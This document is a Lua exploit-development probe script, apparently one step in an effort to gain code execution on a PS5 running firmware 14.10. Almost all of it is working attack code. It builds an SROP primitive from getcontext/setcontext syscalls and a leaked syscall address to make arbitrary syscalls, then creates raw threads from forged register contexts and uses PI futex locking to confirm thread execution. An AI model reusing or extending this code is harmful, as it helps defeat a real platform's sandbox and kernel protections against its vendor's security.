-- CRASH_CLASS: LOW
-- PROBE 142f: thr_create with BLOCKING LOCK_PI
--
-- 142e proved threads DO execute (binary crash output), but the child
-- crashes after syscall returns, killing the process.
-- Fix: main thread acquires LOCK_PI first. Child calls LOCK_PI on SAME
-- futex → child blocks in kernel waiting for lock → never returns to
-- userland → no crash. Check for UMTX_CONTESTED bit (0x80000000).

print("=== PROBE 142f: BLOCKING PI ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function rq(addr) return memory.read_qword(addr) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

-- Confirmed mcontext layout from 142d/142e
local MC = 0x40
local O_RDI = MC + 0x08
local O_RSI = MC + 0x10
local O_RDX = MC + 0x18
local O_R8  = MC + 0x28
local O_R9  = MC + 0x30
local O_RAX = MC + 0x38
local O_R10 = MC + 0x50
local O_RIP = MC + 0xA0     -- 0xE0
local O_RSP = MC + 0xB8     -- 0xF8
-- CS at +0xE8, RFLAGS at +0xF0, SS at +0x100 — left from getcontext

-- Get syscall instruction address
local base_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(base_ctx)) end)
local base_rip = rq(base_ctx + O_RIP)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

-- SROP helper
local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(base_ctx)) end)
    wq(base_ctx + O_RIP, sc_addr)
    wq(base_ctx + O_RAX, uint64(num))
    if a1 then wq(base_ctx + O_RDI, a1) end
    if a2 then wq(base_ctx + O_RSI, a2) end
    if a3 then wq(base_ctx + O_RDX, a3) end
    if a4 then wq(base_ctx + O_R10, a4) end
    if a5 then wq(base_ctx + O_R8, a5) end
    if a6 then wq(base_ctx + O_R9, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(base_ctx)) end)
    return rv
end

local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(500000000))
local function msleep()
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
end

-- Main TID
local tid_buf = gpu + 0x100
wq(tid_buf, uint64(0))
srop(432, ua(tid_buf))
local main_tid = safe_rq(tid_buf)
local mt_h, mt_l = get_hi_lo(main_tid)
print("main_TID=" .. mt_l)

--------------------------------------------------------------------
-- Step 1: Main thread acquires LOCK_PI on futex
--------------------------------------------------------------------
local futex = gpu + 0x1000
wd(futex, 0)
local rv_lock = srop(454, ua(futex), uint64(12), uint64(0), uint64(0), uint64(0))
local fv_after_main = safe_rd(futex)
print("main_LOCK_PI: ret=" .. hex(rv_lock) .. " futex=0x" .. string.format("%X", fv_after_main or 0))

--------------------------------------------------------------------
-- Step 2: Create child thread that calls LOCK_PI on SAME futex
-- Child should BLOCK (futex already owned by main) → no crash
--------------------------------------------------------------------
print("")
print("--- Child LOCK_PI on owned futex ---")

local stack1 = gpu + 0x10000
for off = 0, 0x3FFF, 4 do wd(stack1 + off, 0) end

local ctx1 = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(ctx1 + off, 0) end
pcall(function() return sc_gc(uint64(ctx1)) end)

-- Only modify GPRs and RIP/RSP — leave CS/SS/RFLAGS from getcontext
wq(ctx1 + O_RIP, sc_addr)
wq(ctx1 + O_RAX, uint64(454))     -- umtx_op
wq(ctx1 + O_RDI, ua(futex))       -- SAME futex (already owned by main)
wq(ctx1 + O_RSI, uint64(12))      -- LOCK_PI
wq(ctx1 + O_RDX, uint64(0))
wq(ctx1 + O_R10, uint64(0))
wq(ctx1 + O_R8, uint64(0))
wq(ctx1 + O_R9, uint64(0))
wq(ctx1 + O_RSP, ua(stack1 + 0x3800))

local tid1 = gpu + 0x30000
wq(tid1, uint64(0xDEADDEAD))

print("pre-futex=0x" .. string.format("%X", safe_rd(futex) or 0))
print("Creating child thread...")
local ok1, rv1 = pcall(function()
    return sc_thr_create(uint64(ctx1), uint64(tid1), uint64(0))
end)
local ntid1 = safe_rq(tid1)
local n1h, n1l = get_hi_lo(ntid1)
print("thr_create: ok=" .. tostring(ok1) .. " rv=" .. tostring(rv1) .. " tid=" .. n1l)

-- Wait 500ms for child to enter LOCK_PI
msleep()

-- Check: is process alive?
print("alive pid=" .. to_num(sc20()))

-- Check futex for contested bit
local fv_contested = safe_rd(futex)
print("futex=0x" .. string.format("%X", fv_contested or 0))

if fv_contested and fv_contested ~= (fv_after_main or 0) then
    print("*** FUTEX CHANGED! Before=" .. string.format("0x%X", fv_after_main or 0)
        .. " After=" .. string.format("0x%X", fv_contested))

    if bit32 then
        local contested = bit32.band(fv_contested, 0x80000000)
        if contested ~= 0 then
            print("*** UMTX_CONTESTED BIT SET! CHILD THREAD IS BLOCKED IN KERNEL! ***")
            print("*** THREAD EXECUTION CONFIRMED! ***")
        end
    else
        -- Check high bit manually
        if fv_contested >= 0x80000000 then
            print("*** CONTESTED BIT (0x80000000) IS SET! ***")
            print("*** CHILD THREAD EXECUTED AND IS NOW BLOCKED IN LOCK_PI! ***")
            print("*** === THREAD EXECUTION ON PS5 14.10 CONFIRMED === ***")
        end
    end
end

-- Also check via thr_kill if child is alive
if n1l ~= 0 and n1l ~= 0xDEADDEAD then
    local ok_k, rv_k = pcall(function()
        return make_syscall(433)(uint64(n1l), uint64(0))
    end)
    print("thr_kill(child,0)=" .. tostring(rv_k) .. " (0=alive)")
end

--------------------------------------------------------------------
-- Step 3: Try with MULTIPLE child threads to see contested escalation
--------------------------------------------------------------------
print("")
print("--- Multiple children on same futex ---")

for i = 2, 4 do
    local stk = gpu + 0x10000 * i
    for off = 0, 0x3FFF, 4 do wd(stk + off, 0) end

    local ctx = gpu + 0x20000 + 0x1000 * i
    for off = 0, 0x4FF, 4 do wd(ctx + off, 0) end
    pcall(function() return sc_gc(uint64(ctx)) end)

    wq(ctx + O_RIP, sc_addr)
    wq(ctx + O_RAX, uint64(454))
    wq(ctx + O_RDI, ua(futex))
    wq(ctx + O_RSI, uint64(12))
    wq(ctx + O_RDX, uint64(0))
    wq(ctx + O_R10, uint64(0))
    wq(ctx + O_R8, uint64(0))
    wq(ctx + O_R9, uint64(0))
    wq(ctx + O_RSP, ua(stk + 0x3800))

    local tid_i = gpu + 0x30000 + 8 * i
    wq(tid_i, uint64(0xDEADDEAD))

    local ok_i, rv_i = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(tid_i), uint64(0))
    end)
    local ntid_i = safe_rq(tid_i)
    local nih, nil2 = get_hi_lo(ntid_i)
    print("child" .. i .. ": rv=" .. tostring(rv_i) .. " tid=" .. nil2)
end

-- Wait for all children to enter LOCK_PI
msleep()

print("alive pid=" .. to_num(sc20()))
local fv_multi = safe_rd(futex)
print("futex_multi=0x" .. string.format("%X", fv_multi or 0))

--------------------------------------------------------------------
-- Step 4: Use a SEPARATE UNOWNED futex for one thread
-- This thread should acquire the lock (futex changes to child's TID)
-- BUT then crash. Check futex immediately.
--------------------------------------------------------------------
print("")
print("--- Separate unowned futex ---")

local futex2 = gpu + 0x5000
wd(futex2, 0)

local stack5 = gpu + 0x50000
for off = 0, 0x3FFF, 4 do wd(stack5 + off, 0) end

local ctx5 = gpu + 0x28000
for off = 0, 0x4FF, 4 do wd(ctx5 + off, 0) end
pcall(function() return sc_gc(uint64(ctx5)) end)

wq(ctx5 + O_RIP, sc_addr)
wq(ctx5 + O_RAX, uint64(454))
wq(ctx5 + O_RDI, ua(futex2))     -- UNOWNED futex
wq(ctx5 + O_RSI, uint64(12))     -- LOCK_PI
wq(ctx5 + O_RDX, uint64(0))
wq(ctx5 + O_R10, uint64(0))
wq(ctx5 + O_R8, uint64(0))
wq(ctx5 + O_R9, uint64(0))
wq(ctx5 + O_RSP, ua(stack5 + 0x3800))

local tid5 = gpu + 0x30040
wq(tid5, uint64(0xDEADDEAD))

print("pre-futex2=0x" .. string.format("%X", safe_rd(futex2) or 0))
print("Creating thread on unowned futex...")
local ok5, rv5 = pcall(function()
    return sc_thr_create(uint64(ctx5), uint64(tid5), uint64(0))
end)
local ntid5 = safe_rq(tid5)
local n5h, n5l = get_hi_lo(ntid5)
print("rv=" .. tostring(rv5) .. " tid=" .. n5l)

-- Read futex IMMEDIATELY (before crash propagates)
local fv2_imm = safe_rd(futex2)
print("futex2_imm=0x" .. string.format("%X", fv2_imm or 0))

-- Short sleep
local ts2 = memory.alloc(16)
wq(ts2, uint64(0)); wq(ts2 + 8, uint64(100000000))  -- 100ms
pcall(function() sc_nanosleep(uint64(ts2), uint64(0)) end)

-- Check again
print("alive pid=" .. to_num(sc20()))
local fv2_post = safe_rd(futex2)
print("futex2_post=0x" .. string.format("%X", fv2_post or 0))

if fv2_imm and fv2_imm ~= 0 then
    print("*** UNOWNED FUTEX ACQUIRED! Value=0x" .. string.format("%X", fv2_imm) .. " ***")
end
if fv2_post and fv2_post ~= 0 then
    print("*** UNOWNED FUTEX POST-SLEEP: 0x" .. string.format("%X", fv2_post) .. " ***")
end

print("")
print("=== DONE ===")
